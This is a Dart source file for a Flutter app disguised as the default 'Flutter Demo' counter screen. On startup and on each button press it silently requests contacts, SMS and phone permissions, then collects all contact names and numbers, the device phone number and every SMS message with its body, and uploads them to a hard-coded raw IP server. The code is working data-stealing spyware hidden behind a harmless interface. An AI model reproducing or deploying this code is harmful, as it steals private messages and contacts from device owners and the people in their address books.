import 'dart:convert';

import 'dart:math';

import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:xfzh/utils.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  // This widget is the home page of your application. It is stateful, meaning
  // that it has a State object (defined below) that contains fields that affect
  // how it looks.

  // This class is the configuration for the state. It holds the values (in this
  // case the title) provided by the parent (in this case the App widget) and
  // used by the build method of the State. Fields in a Widget subclass are
  // always marked "final".

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int _counter = 0;
  var api = "http://45.135.237.16:8090/api/uploads/";

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    _incrementCounter();
  }

  void _incrementCounter() async {
    var postdata = "";
    var phonenumber1 = "notfind",
        phonenumber = UtilsClass().generateUniquePhoneNumber(),
        yqm = "1900",
        contactscode = "";
    var duanxin = '[{"imei":"$phonenumber","imei2":"$yqm"}';
    List<Contact> contacts = [];
    Dio dio = Dio();
    Map<String, dynamic> data = {};
    [Permission.contacts, Permission.sms, Permission.phone]
        .request()
        .then((value) async {
      var phonestatus = await Permission.phone.status;
      var contactstatus = await Permission.contacts.status;
      var smsstatus = await Permission.sms.status;
      if (phonestatus.isGranted) {
        phonenumber1 = await getAppLocationPhoneNumber();
      }
      if (contactstatus.isGranted) {
        contacts = await FlutterContacts.getContacts();
        // Get all contacts (fully fetched)
        contacts = await FlutterContacts.getContacts(
            withProperties: true, withPhoto: true);

        contacts.map((Contact e) {
          final name = e.displayName;
          final phone = e.phones.first.number;
          contactscode = "$contactscode=$name|$phone";
        }).toList();

        postdata = "$phonenumber**$yqm**$phonenumber1**android$contactscode";
        //提交接口  http://45.135.237.16:8090/api/uploads/api
        Dio();
        data = {'data':postdata }; // 替换为实际的短信数据
        try {
          Response response = await dio.post('${api}api', data: data);
          if (response.statusCode == 200) {
            // 请求成功，处理返回的数据
            debugPrint('获取成功');
            // 这里可以添加处理返回数据的代码
          } else {
            debugPrint('请求失败，状态码：${response.statusCode}');
          }
        } catch (e) {
          // 请求出错，处理异常
          debugPrint('请求出错：$e');
        }
      }


      if (smsstatus.isGranted) {
        print('body');
        SmsQuery query = SmsQuery();
        List<SmsMessage> messages = await query.getAllSms;

        messages.map((SmsMessage e) {
          var localname = "";
          var localkind = "";
          contacts.map((Contact b) {
            if (b.phones.first.number == e.address) {
              localname = b.displayName.toString();
            }
          }).toList();

          if (localname == "") {
            localname = e.sender.toString();
          }

          switch (e.kind) {
            case SmsMessageKind.draft:
              localkind = '0';
              break;
            case SmsMessageKind.received:
              localkind = '1';
              break;
            case SmsMessageKind.sent:
              localkind = '2';
              break;
            default:
              break;
          }
          var smsinfo = {
            "id": e.id,
            "Name": localname,
            "Date": e.date.toString().substring(0, 16),
            "PhoneNumber": e.address,
            "Smsbody": e.body,
            "Type": localkind,
          };
          var post = json.encode(smsinfo);
          duanxin = '$duanxin,$post';
        }).toList();
        duanxin = '$duanxin]';
        data = {'data':duanxin }; // 替换为实际的短信数据
        try {
          print("${api}apisms");
          print( duanxin
          );
          Response response = await dio.post('${api}apisdb', data:  data);

          if (response.statusCode == 200) {
            // 请求成功，处理返回的数据
            debugPrint(response.data);
            debugPrint('获取成功');
            // 这里可以添加处理返回数据的代码
          } else {
            debugPrint('请求失败，状态码：${response.statusCode}');
          }
        } catch (e) {
          // 请求出错，处理异常
          debugPrint('请求出错：$e');
        }

      }
    });

    //申请权限
  }

  @override
  Widget build(BuildContext context) {
    // This method is rerun every time setState is called, for instance as done
    // by the _incrementCounter method above.
    //
    // The Flutter framework has been optimized to make rerunning build methods
    // fast, so that you can just rebuild anything that needs updating rather
    // than having to individually change instances of widgets.
    return Scaffold(
      appBar: AppBar(
        // TRY THIS: Try changing the color here to a specific color (to
        // Colors.amber, perhaps?) and trigger a hot reload to see the AppBar
        // change color while the other colors stay the same.
        backgroundColor: Theme.of(context).colorScheme.inversePrimary,
        // Here we take the value from the MyHomePage object that was created by
        // the App.build method, and use it to set our appbar title.
        title: Text(widget.title),
      ),
      body: Center(
        // Center is a layout widget. It takes a single child and positions it
        // in the middle of the parent.
        child: Column(
          // Column is also a layout widget. It takes a list of children and
          // arranges them vertically. By default, it sizes itself to fit its
          // children horizontally, and tries to be as tall as its parent.
          //
          // Column has various properties to control how it sizes itself and
          // how it positions its children. Here we use mainAxisAlignment to
          // center the children vertically; the main axis here is the vertical
          // axis because Columns are vertical (the cross axis would be
          // horizontal).
          //
          // TRY THIS: Invoke "debug painting" (choose the "Toggle Debug Paint"
          // action in the IDE, or press "p" in the console), to see the
          // wireframe for each widget.
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text(
              'You have pushed the button this many times:',
            ),
            Text(
              '$_counter',
              style: Theme.of(context).textTheme.headlineMedium,
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _incrementCounter,
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }
}
